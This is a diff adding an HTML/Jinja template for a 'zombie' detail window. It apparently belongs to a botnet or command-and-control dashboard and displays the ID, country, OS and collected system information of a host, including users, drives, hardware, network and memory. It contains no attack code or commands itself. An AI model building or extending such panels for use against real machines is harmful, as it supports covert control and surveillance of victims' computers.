@@ -1,0 +1,65 @@
+{% extends "objects/windows/base_window.html" %}
+
+{% block window %}
+
+  <div style="max-width: 42rem; max-height: 35rem;">
+
+  <div style="width: 28%; float: left;">
+    <h4>zombie{{ data["id"] }}</h4>
+    <img id="img-datasheet" src="{{ url_for('static', filename=img) }}" style="max-width: 11rem; display: block; padding-bottom: 0.5rem;"/>
+  </div>
+
+  <div style="width: 69%; float: right; margin-top: 1.1rem; ">
+
+    <dl class="tree-view datasheet-dl">
+      {% for column in data %}
+        {% if column != 'sysinfo' %}
+          <dt>{{ column }}:</dt>
+          <dd style="overflow-wrap: anywhere;">
+            {{ data[column] }}
+            {% if column == 'current_country' %}
+              {% with country_code=data[column].upper() %}
+                {% include 'objects/dynamic/cc_flag.html' %}
+              {% endwith %}
+            {% endif %}
+          </dd>
+        {% endif %}
+      {% endfor %}
+    </dl>
+  </div>
+
+  <div style="max-width: 100%; clear: both;">
+    <h5 style="text-align: left; border-bottom: 1px dotted darkviolet;">Detailed information</h5>
+    {% for column in data %}
+      {% if column == 'sysinfo' %}
+        <dl style="padding: 0.15rem;" class="tree-view datasheet-dl">
+        {% for field in data[column] %}
+          <dt>{{ field }}:</dt>
+          <dd>
+          {% if field == 'drives_usage' or field == 'all_users' or field == 'detailed_hw' or field == 'detailed_net' or field == 'chipset_pci_bus' or field == 'memory' or data[column][field]|length > 200 %}
+            <pre class="console-output" style="color: white; background-color: #312a33;overflow-x: auto; font-size: 0.55rem;">
+              {{ data[column][field].strip('\n').strip('  ') }}
+            </pre>
+          {% else %}
+            {{ data[column][field].strip('\n').replace('\n', ', ') }}
+            {% if field == 'country' %}
+              {% with country_code=data[column][field].upper() %}
+                {% include 'objects/dynamic/cc_flag.html' %}
+              {% endwith %}
+
+            {% elif field == 'os' %}
+                {% with os=data[column][field].lower() %}
+                  {% include 'objects/dynamic/os_icon.html' %}
+                {% endwith %}
+            {% endif %}
+          {% endif %}
+          </dd>
+        {% endfor %}
+        </dl>
+      {% endif %}
+    {% endfor %}
+  </div>
+
+  </div>
+
+{% endblock %}
